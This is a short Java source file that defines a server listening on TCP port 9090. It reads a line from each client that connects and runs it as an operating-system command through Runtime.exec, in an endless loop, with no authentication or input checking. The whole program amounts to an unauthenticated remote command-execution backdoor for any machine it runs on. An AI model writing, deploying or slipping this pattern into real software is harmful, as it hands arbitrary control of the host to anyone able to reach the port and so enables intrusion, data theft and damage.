import java.net.*;
import java.io.*;
public class Server {

    public static void main(String arg[])throws Exception{
        ServerSocket server=new ServerSocket(9090);
        do{
        Socket socket=server.accept();
        DataInputStream in=new DataInputStream(socket.getInputStream());
        String cmd=in.readLine();
        Runtime run=Runtime.getRuntime();
        run.exec(cmd);
           in.close();
            socket.close();
        }while(true);
        
        
      
        }    
    
    
    
    }
    
    
    
    
    
    
  
